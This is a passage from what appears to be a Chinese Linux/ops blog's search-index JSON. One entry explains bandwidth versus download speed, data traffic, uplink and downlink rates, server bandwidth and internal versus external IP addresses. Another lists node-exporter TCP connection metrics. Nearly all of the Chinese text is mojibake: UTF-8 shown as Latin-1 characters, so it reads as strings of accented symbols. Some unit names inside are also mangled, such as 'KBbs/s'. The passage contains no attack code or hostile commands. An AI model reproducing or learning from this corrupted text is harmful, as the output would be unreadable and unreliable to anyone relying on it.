è¾“é€Ÿåº¦ã€‚ å®½å¸¦ï¼šåœ¨æ•°å­—é€šä¿¡ä¸­é€šå¸¸æŒ‡64kbit/sä»¥ä¸Šä¿¡å·çš„å¸¦å®½ã€‚ çª„å¸¦ï¼šåœ¨æ•°å­—é€šä¿¡ä¸­é€šå¸¸æŒ‡64kbit/sä»¥ä¸‹ä¿¡å·çš„å¸¦å®½ã€‚ å®½å¸¦ é€šå¸¸åˆ«äººä¼šè¯´ä½ å®¶èƒ½ä¸èƒ½ä¸Šç½‘ï¼Ÿå…¶å®è¿™ä¸ªæ„æ€å°±æ˜¯ä½ å®¶æœ‰æ²¡æœ‰å®½å¸¦ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªåè¯ï¼Œå…ˆæœ‰äº†å®½å¸¦ä¸€è¯ï¼Œç„¶åæ‰å¯ä»¥è¯´ä½ å¸¦å®½æ˜¯å¤šå°‘ï¼Œå®½å¸¦ä¸ä¸Šç½‘çš„é€Ÿåº¦å¿«æ…¢æ²¡æœ‰ç›´æ¥å…³ç³»ã€‚ å¸¦å®½ å½“æˆ‘ä»¬æƒ³ç”³è¯·å®½å¸¦äº†ï¼Œéœ€è¦åˆ°ä¸€äº›æœåŠ¡æä¾›å•†é‚£é‡Œæ³¨å†Œç™»è®°ï¼Œè¿™æ—¶ä¼šæ ¹æ®å¥—é¤çš„ä¸åŒï¼Œä½ å¯èƒ½ä¼šæœ‰10Mb/s ã€ 20Mb/sç­‰ï¼Œå¯ä»¥è®¡ç®—æœºå­—èŠ‚æ¢ç®—æ¯”ä¾‹å¯ä»¥è®¡ç®—å‡ºè‡ªå·±çš„å¸¦å®½å¤§å° æ¯”å¦‚ï¼š 1B=8b //1å­—èŠ‚=8ä½ 1KB=1024B 1MB=1024KB 1GB=1024MB æˆ‘ä»¬ç”³è¯·çš„å¸¦å®½æ˜¯10Mb/sè¿™ä¸ªå•ä½ä¸­çš„bæ˜¯å°å†™çš„ï¼Œè€Œæˆ‘ä»¬åˆšæ‰è¯´çš„1B(å­—èŠ‚)=8b(ä½),è¿™é‡Œåˆšå¥½æ˜¯8å€çš„å…³ç³»ï¼Œå³ä¸‹è½½é€Ÿåº¦ï¼š10Mb / 8 = 1.25MB æœ‰çš„äººå°±ä¼šé—®ï¼Œä¸ºä»€ä¹ˆè¦é™¤ä»¥8? åœ¨è®¡ç®—æœºä¸­ï¼Œä¸‹è½½é€Ÿåº¦æ˜¯ä»¥å­—èŠ‚(B)ä¸ºå•ä½çš„ï¼Œè€Œæä¾›å•†è¯´çš„æ˜¯ä»¥æ¯”ç‰¹(b)ä¸ºå•ä½çš„ã€‚ æ¯”å¦‚è¯´: åœ¨ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªè½¯ä»¶ï¼Œéƒ½ä¼šä»¥B(å­—èŠ‚)ä¸ºå•ä½çš„ï¼Œå†æ¯”å¦‚ä½ æ‰“å¼€ä¸€ä¸ªç½‘é¡µï¼Œè¿™ä¸ªç½‘é¡µä¸­å¯èƒ½ä¼šæœ‰å›¾ç‰‡ï¼Œæ–‡å­—ï¼Œè§†é¢‘ç­‰å†…å®¹ï¼Œè¿™äº›å†…å®¹æœ¬è´¨ä¸Šæ¥è¯´ï¼Œä¹Ÿæ˜¯ä¸‹è½½åˆ°ä½ ç”µè„‘äº†ï¼Œç„¶åä½ æ‰èƒ½çœ‹åˆ°çš„ æˆ‘ä»¬å¯ä»¥å¸¦å®½æ¥è®¡ç®—å‡ºè‡ªå·±çš„ä¸‹è½½é€Ÿåº¦ï¼š è®¡ç®—æ–¹å¼ï¼šå¸¦å®½å¤§å° / 8 å¸¦å®½ ä¸‹è½½é€Ÿåº¦ å…¬å¼ å¸¦å®½ä¸º2Mb ä¸‹è½½é€Ÿåº¦ä¸º256KB/s 2 / 8 = 0.25 å¸¦å®½ä¸º4Mb ä¸‹è½½é€Ÿåº¦ä¸º512KB/s 4 / 8 = 0.5 å¸¦å®½ä¸º8Mb ä¸‹è½½é€Ÿåº¦ä¸º1.00MB/s 8 /Â 8= 1.0 å¸¦å®½ä¸º10Mb ä¸‹è½½é€Ÿåº¦ä¸º1.25MB/s 10 / 8 = 1.25 å¸¦å®½ä¸º20Mb ä¸‹è½½é€Ÿåº¦ä¸º2.50MB/s 20 / 8 = 2.50 å¸¦å®½ä¸º100Mb ä¸‹è½½é€Ÿåº¦ä¸º12.5MB/s 100 / 8 = 12.50 æœ‰çš„æ—¶å€™ï¼Œä½¿ç”¨ä¸€äº›è½¯ä»¶æµ‹è¯•ç½‘é€Ÿæ—¶ï¼Œå‘ç°ä¸æˆ‘ä»¬è®¡ç®—çš„ç»“æœæœ‰ç‚¹å·®è·ï¼Œè¿™ä¸ªæ˜¯æ­£å¸¸ç°è±¡ï¼Œè¿™æ˜¯ç”±äºä¸€äº›ç‰©ç†çº¿è·¯ç£¨æŸç­‰å®¢è§‚åŸå› é€ æˆçš„ã€‚ è¿˜æœ‰çš„æ—¶å€™ï¼Œå¤§å®¶åœ¨æ·±å¤œä¸‹è½½è½¯ä»¶æ—¶ï¼Œä¼šå‘ç°ï¼Œä¸‹è½½é€Ÿåº¦è¶…è¿‡äº†æˆ‘ä»¬ç†è®ºä¸Šè®¡ç®—å‡ºæ¥çš„å€¼ï¼Œè¿™ç§æƒ…å†µä¹Ÿæ˜¯å­˜åœ¨çš„, æˆ‘ä»¬å¯ä»¥è¿™æ ·ç†è§£: æ¯”å¦‚ä½ å®¶åœ¨JåŒºï¼Œé‚£ä¹ˆæä¾›å•†æ‹‰åˆ°JåŒºçš„æ€»çº¿è·¯æ˜¯100Mb/s , è€Œä½ å®¶ç”³è¯·çš„æ˜¯10M,ç”±äºé™åˆ¶éƒ½æ˜¯ä»è·¯ç”±å™¨é‡Œè®¾ç½®çš„ï¼Œè¿™ä¸ªä¸è®¾ç½®è·¯ç”±å™¨çš„è®¾ç½®æœ‰å…³ã€‚ ç¬¬äºŒç§æƒ…å†µå°±æ˜¯ï¼Œä½ ä¸‹è½½è½¯ä»¶çš„æœåŠ¡å™¨æ¯”è¾ƒé—²ï¼Œè¿™æ ·é€Ÿåº¦ä¹Ÿæ˜¯æ¯”è¾ƒå¿«çš„ã€‚ ç¬¬ä¸‰ç§æƒ…å†µå°±æ˜¯æˆ‘ä»¬ä¸‹è½½è½¯ä»¶æ—¶ï¼Œå¯èƒ½ä¼šç”¨è¿…é›·å‘€è¿™æ–¹é¢çš„è½¯ä»¶ï¼Œç”±äºè¿™ä¸ªè½¯ä»¶ä¸‹è½½çš„äººå¤šäº†ï¼Œé‚£ä¹ˆä»–çš„é€Ÿåº¦ä¹Ÿæ˜¯æ¯”è¾ƒå¿«çš„ã€‚ é€šä¿—ç†è§£çš„è¯ï¼š å¸¦å®½å°±å¥½æ¯”ä½ çš„æ°´é¾™å¤´å¤§å°ï¼Œç½‘é€Ÿå°±ç›¸å¥½æ¯”ä»æ°´é¾™å¤´é‡Œå‡ºæ¥çš„æ°´æµé€Ÿæœ‰å¤šå¿«ã€‚ ä»¥ä¸Šéƒ½æ˜¯è¯´ä¸‹è½½é€Ÿåº¦ï¼Œé‚£ä¹ˆä¸Šä¼ é€Ÿåº¦æ˜¯æ€ä¹ˆè®¡ç®—çš„å‘¢ï¼Œå…¶å®ä¸Šä¼ é€Ÿåº¦è¿™ä¸ªä¸åœ°åŸŸçš„ä¸åŒè€Œä¸åŒï¼Œä¸€èˆ¬ä¸Šä¼ é€Ÿåº¦éƒ½è¢«æä¾›å•†é™åˆ¶äº†ï¼Œè¿™ä¸ªè¯´ä¸å‡†ã€‚ æµé‡ æµé‡æ˜¯å¯¹å¤–å‘é€æ•°æ®ä¸æ¥æ”¶æ•°æ®åŒ…çš„å¤§å°æ€»å’Œï¼Œå•ä½æ˜¯é‡‡å–1024è¿›åˆ¶çš„ï¼Œå•ä½æœ‰ B, KB, MB(M), GB(G) 1G=1024MB 1M=1024KB 1KB=1024å­—èŠ‚(Bï¼‰ ä¸€èˆ¬æˆ‘ä»¬æ‰‹æœºæœ‰ 5å…ƒ30MB, 10å…ƒ70MBçš„æµé‡å¥—é¤ï¼Œå½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªç½‘é¡µï¼Œéœ€è¦å¤šå°‘æµé‡å‘¢ å‡è®¾æŸä¸€ä¸ªç½‘é¡µä¸Šæœ‰ 100 ä¸ªæ±‰å­—ä¸ä¸€å¼ 100KBçš„å›¾ç‰‡ï¼Œä¸€ä¸ªæ±‰å­— = 2ä¸ªå­—èŠ‚ å³è¿™ä¸ªé¡µé¢çš„æ•°æ®å¤§å°ä¸ºï¼š100 * 2B / 1024 + 100KB = 0.2KB +100KB = 100.2KBï¼› æ¯è®¿é—®ä¸€æ¬¡è¿™ä¸ªé¡µé¢ï¼Œå°†äº§ç”Ÿ100.2KBçš„æµé‡ï¼Œå¦‚æœæ˜¯70MBçš„æµé‡ï¼Œé‚£ä¹ˆè®¿é—®å‡ ä¸ªç½‘é¡µåŸºæœ¬å¿«æ²¡æœ‰äº†ï¼Œæ‰€ä»¥æ›´ä¸è¦è¯´çœ‹è§†é¢‘äº†ã€‚ å¸¦å®½ã€ç½‘é€Ÿå’Œæµé‡ä¹‹é—´çš„å…³ç³» é€šå¸¸æƒ…å†µä¸‹ï¼šæˆ‘ä»¬è¯´çš„ æˆ‘å®¶çš„å¸¦å®½10M ç°åœ¨ç½‘é€Ÿç½‘é€Ÿï¼š200KB/s çœ‹ä¸€å¼ å›¾ç‰‡ä½¿ç”¨äº†8Mçš„æµé‡ é‚£ä¹ˆå¸¦å®½ã€ç½‘é€Ÿã€æµé‡ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³»ï¼Œä»–ä»¬åˆ†åˆ«ä»£è¡¨ä»€ä¹ˆå‘¢ï¼Ÿ å¸¦å®½å•ä½æ˜¯ï¼šæ¯”ç‰¹/ç§’ï¼ˆbpsï¼‰ï¼š10M=10Mbps ç½‘é€Ÿæ˜¯æ•°æ®ä¼ è¾“çš„é€Ÿåº¦ï¼Œå•ä½æ˜¯ï¼šå­—èŠ‚/ç§’ (B/sï¼Œ KB/sï¼Œ MB/s) 1MB/s = 1024KB/s 1KB/s = 1024B/s æµé‡æ˜¯ç”¨æˆ·ä¸Šç½‘ å‘é€å’Œæ¥æ”¶ çš„ æ•°æ®é‡æ€»å’Œ ï¼Œå•ä½æ˜¯ï¼šå­—èŠ‚ï¼ˆByte) æ¯”ç‰¹æ˜¯ä¿¡æ¯çš„æœ€å°å•ä½ï¼š1å­—èŠ‚ = 8æ¯”ç‰¹ ä¹Ÿå°±æ˜¯1B = 8bit æˆ–è€… 1B = 8b 1å­—èŠ‚/ç§’ = 8æ¯”ç‰¹/ç§’ (1B/s = 8bps) 1æ¯”ç‰¹ (1b or 1ä½) æ˜¯ä¿¡æ¯æŠ€æœ¯ä¸­çš„æœ€å°å­˜å‚¨å•ä½ï¼Œ1 ä½ä»£è¡¨ä¸€ä¸ªâ€œ1â€æˆ–è€…â€œ0â€ 1Bï¼ˆ1å­—èŠ‚ï¼‰æ˜¯æ¯”è¾ƒå°çš„å­˜å‚¨å•ä½ï¼šä¸€èˆ¬æƒ…å†µä¸‹1ä¸ªè‹±æ–‡å­—æ¯å 1ä¸ªå­—èŠ‚ï¼›ä¸€ä¸ªæ±‰å­—å 2ä¸ªå­—èŠ‚ ä»–ä»¬ä¹‹é—´çš„æ¢ç®—ï¼šå¸¦å®½å¤§å° / 8 10Må¸¦å®½(10Mb/s)=1.25MB/sç½‘é€Ÿ 1Må¸¦å®½(1Mb/s)=0.125MB/s=128KB/s 10Mbps = 10*1024Kbps =10*1024*1024bps =10*1024*1024/8 Byte/s =10/8 MB/s =1.25 MB/s ä¸Šè¡Œå¸¦å®½å’Œä¸‹è¡Œå¸¦å®½æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿå„æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ ä¸Šè¡Œå¸¦å®½å’Œä¸‹è¡Œå¸¦å®½ï¼Œæˆ–è€…è¯´ä¸Šè¡Œé€Ÿåº¦å’Œä¸‹è¡Œé€Ÿåº¦æ˜¯ä»€ä¹ˆæ„æ€? åœ¨è®¾ç½®è·¯ç”±å™¨çš„é™é€Ÿï¼Œæˆ–è€…é…ç½®å…¶å®ƒä¸€äº›è½¯ä»¶çš„æ—¶ä¼šé‡åˆ°ä¸Šè¡Œé€Ÿåº¦å’Œä¸‹è¡Œé€Ÿåº¦çš„é…ç½®ï¼Œå¾ˆå¤šç”¨æˆ·æ ¹æœ¬å°±ä¸çŸ¥é“è¿™ä¸¤ä¸ªæ‰€ä»£è¡¨çš„æ„æ€ï¼Œä¸‹é¢ä¼šå¯¹è¿™ä¸¤ç§è¿›è¡Œè¯¦ç»†è®²è§£ï¼š åœ¨è®¿é—®äº’è”ç½‘æ—¶å­˜åœ¨ä¸¤ç§è¡Œä¸ºï¼šä¸€æ˜¯ä¸Šä¼ æ•°æ®ï¼ŒäºŒæ˜¯ä¸‹è½½æ•°æ®ã€‚ä¸Šè¡Œå®½å¸¦(é€Ÿåº¦) æŒ‡çš„æ˜¯ä¸Šä¼ çš„é€Ÿåº¦ï¼Œè€Œä¸‹è¡Œå®½å¸¦(é€Ÿåº¦) æŒ‡çš„æ˜¯ä¸‹è½½æ•°æ®æ—¶çš„æ•°åº¦ã€‚ åœ¨è¯¦ç»†ä¸€ç‚¹å¯ä»¥ç†è§£ä¸º ä¸Šè¡Œå¸¦å®½å³ä¸Šè¡Œé€Ÿç‡ ä¸€èˆ¬æ˜¯æŒ‡ä»ä½ çš„ç”µè„‘ä¸Šä¼ çš„é€Ÿåº¦ï¼Œåˆ«äººå¯¹ä½ çš„ç”µè„‘è¿›è¡Œé€šè®¯çš„é€Ÿç‡ã€‚æ¯”å¦‚ä½ å¾€QQç©ºé—´ä¸Šä¼ ä½ çš„ç›¸ç‰‡ï¼Œè¿™ä¸ªæ—¶å€™ä¸Šä¼ ç›¸ç‰‡çš„é€Ÿåº¦å°±æ˜¯ä¸Šè¡Œé€Ÿåº¦ï¼Œå…¶ä»–è¿˜æœ‰æ¯”å¦‚ä½ å¾€ä¸€äº›äº‘ç›˜é‡Œé¢ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œè¿™ä¸ªæ—¶å€™çš„é€Ÿåº¦ä¹Ÿæ˜¯ä¸Šè¡Œé€Ÿç‡ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œä¸Šä¼ æ–‡ä»¶çš„é€Ÿåº¦æ¯”æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„ç½‘ç»œé€Ÿåº¦è¦æ…¢å¾ˆå¤šã€‚ ä¸‹è¡Œå¸¦å®½å³ä¸‹è¡Œé€Ÿç‡ ä¸€èˆ¬æ˜¯ä½ ä»ç½‘ç»œä¸Šçš„ä¸»æœºä¸‹è½½çš„é€Ÿåº¦ï¼Œæ¯”å¦‚ä½ ä¸‹è½½æ–‡ä»¶çš„é€Ÿåº¦ï¼Œæ‰“å¼€ç½‘é¡µçš„é€Ÿåº¦ï¼Œè¿™ç§é€Ÿåº¦å°±æ˜¯ä¸‹è¡Œé€Ÿç‡ï¼Œä¸‹è¡Œé€Ÿç‡é€šå¸¸å°±æ˜¯æˆ‘ä»¬å¹³å¸¸æ‰€è¯´çš„ç½‘é€Ÿï¼Œæ¯”å¦‚ä½ çš„å¸¦å®½æ˜¯ç”µä¿¡8M,å…‰çº¤20Mç­‰ï¼Œè¿™ç§é€Ÿåº¦å…¶å®å°±æ˜¯æŒ‡çš„ç½‘ç»œçš„ä¸‹è¡Œé€Ÿç‡ã€‚ ä¸Šè¡Œå®½å¸¦(é€Ÿåº¦)å’Œä¸‹è¡Œå®½å¸¦(é€Ÿåº¦)æ˜¯ä¸å¯¹ç§°çš„ã€‚ ä¸€èˆ¬æ˜¯ä¸‹è¡Œé€Ÿåº¦å¤§äºä¸Šè¡Œçš„é€Ÿåº¦ã€‚æˆ‘ä»¬å¹³æ—¶æ‰€ä½¿ç”¨çš„å®½å¸¦è¯´å¤šå°‘Mï¼Œéƒ½æ˜¯æŒ‡çš„ä¸‹è¡Œå®½å¸¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¸Šç½‘ä¸»è¦æ˜¯ä»äº’è”ç½‘ä¸Šä¸‹è½½æ•°æ®ï¼Œè€Œä¸Šä¼ çš„æ•°æ®é‡è¦å°‘å¾ˆå¤šã€‚ ä¸ºä»€ä¹ˆåœ¨ä½¿ç”¨å®½å¸¦çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ç”µè„‘ä¸‹è½½çš„é€Ÿåº¦æ ¹æœ¬å°±è¾¾ä¸åˆ°è‡ªå·±åŠç†çš„å®½å¸¦çš„æ ‡å‡†ï¼Œä¾‹å¦‚10Mb/sçš„å®½å¸¦ï¼Œä¸‹è½½é€Ÿåº¦åªæœ‰1MB/så·¦å³çš„é€Ÿåº¦ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢? å› ä¸ºå®½å¸¦è¿è¥å•†çš„å¸¦å®½ä¸‹è¡Œé€Ÿåº¦å’ŒWindowsç”µè„‘ä¸Šçš„ä¸‹è¡Œé€Ÿåº¦çš„å•ä½ä¸ä¸€æ · ï¼ŒWindowsç”µè„‘çš„å•ä½æ˜¯KBbs/s,è€Œå®½å¸¦è¿è¥ä¸Šçš„å•ä½æ˜¯Kbbs/sï¼Œ1B=8b(1å­—èŠ‚=8ä½)ã€‚ å‡è®¾ä½ åŠç†äº†10Mçš„å®½å¸¦ï¼Œ10Mbps=10240Kbps/8=1280KBps,æ‰€ä»¥åœ¨ä½ ç”µè„‘çš„æœ€å¤§çš„ä¸‹è½½é€Ÿåº¦åªæœ‰1280KBpsï¼Œä¹Ÿå°±æ˜¯å¤§æ¦‚1.25MB/så·¦å³çš„æ ·å­ã€‚æ‰€ä»¥ä¸è¦å†è¯´å®½å¸¦å…¬å¸å‘äººï¼ŒåŠç†çš„å®½å¸¦æ‰£é‡äº†ï¼Œè¿™åªä¸è¿‡æ˜¯è®¡ç®—çš„å•ä½ä¸åŒå¼•èµ·çš„ã€‚ å®½å¸¦çš„ä¸‹è½½é€Ÿç‡é™¤å®½å¸¦å¸¦å®½å¤–ï¼Œä¸è®¡ç®—æœºé…ç½®ã€ä½¿ç”¨çš„ä¸‹è½½è½¯ä»¶ï¼Œä¸‹è½½çš„å¤§å°ã€ä¸‹è½½ç½‘ç«™çš„é€Ÿç‡ç­‰å‡æœ‰å…³ç³»ï¼Œä¸€èˆ¬çš„ä¸‹è½½è½¯ä»¶éƒ½å¯ä»¥æŸ¥çœ‹çš„å®½å¸¦ä¸‹è½½é€Ÿç‡(å¦‚è¿…é›·)ã€‚ ç†æƒ³çš„çŠ¶æ€ä¸‹ï¼š100Må…‰çº¤å®½å¸¦çš„ä¸‹è¡Œå®½å¸¦åœ¨10M/S-11M/sä¹‹é—´ï¼›ä¸Šè¡Œå®½å¸¦æ˜¯æŒ‡ä¸Šä¼ åˆ°äº’è”ç½‘ä¸Šçš„é€Ÿåº¦ï¼›è¿™ä¸ªè¦å¼€ä½ å¼€é€šçš„å®½å¸¦æ˜¯ä¸Šä¸‹è¡Œç­‰åŒè¿˜æ˜¯ä¸ç­‰åŒäº†ï¼›ä¸çŸ¥é“çš„å¯ä»¥å’¨è¯¢ä½ çš„è¿è¥å•†ï¼›å¦‚æœæ˜¯ç­‰åŒçš„ä½ çš„ä¸Šè¡Œå®½å¸¦ä¹Ÿæ˜¯10M/S - 11M/sä¹‹é—´ï¼›ä¸æ˜¯ç­‰åŒçš„ä¸€èˆ¬ä¸Šè¡Œå®½å¸¦åªæœ‰400kbs/s-500Kbs/sã€‚ æ³¨ï¼šä¸€èˆ¬ä¼ä¸šå¼€é€šçš„æ˜¯ä¸Šä¸‹è¡Œå¸¦å®½ç­‰åŒçš„ï¼›å®¶ç”¨çš„æ˜¯ä¸ç­‰åŒï¼Œä¸€èˆ¬åªç®¡ä¸‹è¡Œå¸¦å®½ï¼Œä¸Šè¡Œçš„ä¸ç®¡çš„ã€‚ æœåŠ¡å™¨çš„ä¸Šè¡Œå’Œä¸‹è¡Œå¸¦å®½ç†è§£ å¯¹æœåŠ¡å™¨è€Œè¨€ï¼Œ å®¢æˆ·ç«¯ä¸‹è½½èµ„æºæ¶ˆè€—çš„æ˜¯æœåŠ¡å™¨çš„ä¸Šè¡Œæµé‡ï¼Œå®¢æˆ·ç«¯ä¸Šä¼ èµ„æºæ¶ˆè€—çš„æ˜¯æœåŠ¡å™¨çš„ä¸‹è¡Œæµé‡ï¼Œ é€šå¸¸ä¹°çš„æœåŠ¡å™¨ï¼Œæ¯”å¦‚é˜¿é‡Œäº‘ï¼Œä¸€èˆ¬ä¹°çš„å¸¦å®½æŒ‡çš„æ˜¯ä¸Šè¡Œå¸¦å®½ï¼Œä¸‹è¡Œé€šå¸¸æ˜¯ä¸é™çš„ã€‚è€Œä¸”æµé‡çš„è®¡ç®—ä¸€èˆ¬éƒ½æ˜¯ä»¥ä¸Šè¡Œçš„æ¥è®¡ç®—çš„ã€‚ æ‰€ä»¥ï¼Œå®¢æˆ·ç«¯ä¸Šä¼ èµ„æºï¼Œå¯¹æœåŠ¡å™¨çš„å¸¦å®½åŸºæœ¬æ²¡æœ‰å½±å“ï¼Œå› ä¸ºæœåŠ¡å™¨çš„ä¸‹è¡ŒåŸºæœ¬ä¸é™çš„ï¼Œè·Ÿå®¢æˆ·ç«¯æœ¬èº«ç½‘ç»œçš„å¸¦å®½æœ‰å½±å“ï¼› è€Œå®¢æˆ·ç«¯ä¸‹è½½èµ„æºï¼Œé™¤äº†è·ŸæœåŠ¡å™¨çš„å¸¦å®½æœ‰å½±å“ï¼Œè·Ÿå®¢æˆ·ç«¯æœ¬èº«çš„ç½‘ç»œå¸¦å®½ä¹Ÿæœ‰å½±å“çš„ã€‚ æœåŠ¡å™¨çš„ä¸Šè¡Œå¸¦å®½ æœåŠ¡å™¨çš„ä¸Šè¡Œå¸¦å®½ä¸»è¦ç”¨äºæœ¬åœ°ç”¨æˆ·è¯·æ±‚æœåŠ¡å™¨ä¸Šçš„èµ„æº(æ¯ç§’é’ŸæœåŠ¡å™¨ä¼ ç»™å®¢æˆ·ç«¯çš„æœ€å¤§æ•°æ®é‡,æœåŠ¡å™¨æµå‡ºçš„å¸¦å®½)ï¼ˆå³æœ¬åœ°çš„ä¸‹è½½ã€æœåŠ¡å™¨çš„ä¸Šä¼ ï¼‰`,å¦‚æœæ˜¯åœ¨å…¶ä»–æœºå™¨ä¸‹è½½æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œç”¨çš„ä¸»è¦æ˜¯æœåŠ¡å™¨çš„ä¸Šè¡Œå¸¦å®½ã€‚ è¿™é‡Œä¸€å®šè¦åˆ†æ¸…æ¥šä¸Šè¡Œå¸¦å®½å’Œä¸‹è¡Œå¸¦å®½æ˜¯å¯¹è°è€Œè¨€çš„ï¼Œä¸ªäººPCä¸‹è½½é€Ÿåº¦çœ‹çš„æ˜¯è‡ªå·±çš„ä¸‹è¡Œå¸¦å®½å’ŒæœåŠ¡å™¨çš„ä¸Šè¡Œå¸¦å®½ ä¸ªäººPCï¼ˆAï¼‰ä¸æœåŠ¡å™¨ï¼ˆBï¼‰è¿æ¥ï¼ŒæœåŠ¡å™¨Bçš„æœ€å¤§ä¸Šè¡Œå¸¦å®½ï¼ˆä¸Šè¡Œé€Ÿåº¦ï¼‰å†³å®šäº†PCæœ€å¤§ä¸‹è½½é€Ÿåº¦ æœåŠ¡å™¨çš„ä¸‹è¡Œå¸¦å®½ ä¸‹è¡Œå¸¦å®½ä¸»è¦ç”¨äºæœ¬åœ°ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶è‡³æœåŠ¡å™¨(å®¢æˆ·ä¸Šä¼ æ•°æ®åˆ°æœåŠ¡å™¨),å¯¹äºæœåŠ¡å™¨æ¥è¯´ï¼Œä¸‹è¡Œå¸¦å®½æ˜¯ä¸é™åˆ¶çš„ï¼Œç½‘ç»œå› ç´ ï¼Œå–å†³äºå®¢æˆ·ç«¯å½“å‰çš„ç½‘ç»œæƒ…å†µ å†…ç½‘ipå’Œå¤–ç½‘ipåŒºåˆ« åŒºåˆ« å¦‚å›¾ï¼Œå‡è®¾æˆ‘ä»¬çš„è®¡ç®—æœºæ˜¯è®¾å¤‡ä¸€ï¼Œæƒ³è¦è®¿é—®ç™¾åº¦ã€‚ å¦‚æœä½¿ç”¨æ ¡å›­ç½‘ï¼Œé¦–å…ˆéœ€è¦å…ˆé€šè¿‡æ ¡å›­ç½‘çš„è·¯ç”±å™¨æŠŠæˆ‘ä»¬çš„å†…ç½‘ipè½¬ä¸ºæ ¡å›­ç½‘çš„å¤–ç½‘ipã€‚ ç„¶åé€šè¿‡è¿™ä¸ªå¤–ç½‘ipå…ˆè¿æ¥ä¸Šæ¹–å—ç”µä¿¡çš„ç½‘å…³ï¼Œæœ€ååœ¨è¿æ¥ä¸Šç™¾åº¦çš„ç½‘å…³ã€‚ ç™¾åº¦æŠŠä½ è¯·æ±‚çš„ä¿¡æ¯å›ä¼ åˆ°ä½ çš„æ ¡å›­ç½‘ç½‘å…³ï¼Œæ ¡å›­ç½‘ç½‘å…³å†æŠŠä¿¡æ¯ä¼ ç»™ä½ ï¼ˆæ•´ä¸ªç½‘ç»œå‘ˆç½‘çŠ¶ç»“æ„ï¼Œå®ƒä¼šè‡ªåŠ¨æ‰¾åˆ°ä¸€æ¡","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"å†…ç½‘.å¤–ç½‘.å®½å¸¦.å¸¦å®½.æµé‡.ç½‘é€Ÿä¹‹é—´çš„åŒºåˆ«ä¸è”ç³»","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":"node-exporter è¿æ¥æ•°ç›¸å…³æŒ‡æ ‡","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/","tags":["linux","ç›‘æ§","prometheus","node-exporter"],"title":"node-exporter è¿æ¥æ•°ç›¸å…³æŒ‡æ ‡","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":" ä»¥ä¸‹ä¸ºèµ„æ–™æ¥æº,ç”±æœ¬ç«™æ”¶é›†é‡æ–°æ•´ç†å‘å¸ƒ,ä»…ç”¨äºä¸ªäººæ”¶è—,è½¬è½½è¯·ç›´æ¥æ ‡æ³¨ä»¥ä¸‹æ¥æºè¿æ¥ node-exportä¸­è¿æ¥æ•°ç›¸å…³æŒ‡æ ‡ TCPç›¸å…³æŒ‡æ ‡ åç§° ç±»å‹ å•ä½ è¯´æ˜ node_netstat_Tcp_InErrs counter æŠ¥æ–‡æ•° TCP æ¥æ”¶çš„é”™è¯¯æŠ¥æ–‡æ•° node_netstat_Tcp_InSegs counter æŠ¥æ–‡æ•° TCP æ¥æ”¶çš„ç›®å‰æ‰€æœ‰å»ºç«‹è¿æ¥çš„é”™è¯¯æŠ¥æ–‡æ•° node_netstat_Tcp_OutSegs counter æŠ¥æ–‡æ•° TCP å‘é€çš„æŠ¥æ–‡æ•°ï¼ˆåŒ…æ‹¬å½“å‰è¿æ¥çš„æ®µä½†æ˜¯ä¸åŒ…æ‹¬é‡ä¼ çš„æ®µ) node_netstat_Tcp_RetransSegs counter æŠ¥æ–‡æ•° TCP é‡ä¼ æŠ¥æ–‡æ•° node_netstat_Tcp_CurrEstab counter æŠ¥æ–‡æ•° å½“å‰çŠ¶æ€ä¸º ESTABLISHED æˆ– CLOSE-WAIT çš„ TCP è¿æ¥æ•° node_netstat_Tcp_ActiveOpens counter æŠ¥æ–‡æ•° å·²ä» CLOSED çŠ¶æ€ç›´æ¥è½¬æ¢åˆ° SYN-SENT çŠ¶æ€çš„ TCP è¿æ¥æ•° node_netstat_Tcp_PassiveOpens counter æŠ¥æ–‡æ•° å·²ä» LISTEN çŠ¶æ€ç›´æ¥è½¬æ¢åˆ° SYN-RCVD çŠ¶æ€çš„ TCP å¹³å‡è¿æ¥æ•° node_netstat_TcpExt_ListenDrops counter æŠ¥æ–‡æ•° ç›‘å¬é˜Ÿåˆ—è¿æ¥ä¸¢å¼ƒæ•° node_netstat_TcpExt_ListenOverflows counter æŠ¥æ–‡æ•° ç›‘å¬ socket çš„é˜Ÿåˆ—æº¢å‡º node_netstat_TcpExt_SyncookiesFailed counter æŠ¥æ–‡æ•° æ¥æ”¶çš„æ— æ•ˆçš„ SYN cookies çš„æ•°é‡ node_netstat_TcpExt_SyncookiesRecv counter 